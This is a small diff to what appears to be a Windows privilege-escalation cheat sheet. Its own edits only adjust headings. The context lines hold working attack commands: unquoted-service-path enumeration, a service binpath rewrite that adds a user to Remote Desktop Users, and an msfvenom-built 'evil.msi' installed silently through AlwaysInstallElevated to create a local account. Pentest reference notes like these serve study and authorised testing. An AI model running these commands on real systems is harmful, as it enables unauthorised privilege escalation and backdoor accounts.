@@ -611,7 +611,7 @@ net start upnphost
 ```
 
 
-#### Unquoted Service Paths - race condition
+#### Unquoted Service Paths - race condition enum
 
 ```
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
@@ -650,13 +650,14 @@ sc config upnphost binpath= “net localgroup “/Remote Desktop Users/” lecon
 ```
 
 
-#### Always Install Elevated
+# Always Install Elevated
 ```
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 Msfvenom -p windows/useradd user=lemon pass=pass -f evil.msi > evil.msi
 msiexec /quiet /qn /I c:evil.msi
 ```
+
 # Credentials and permissions
 
 #### Credential search
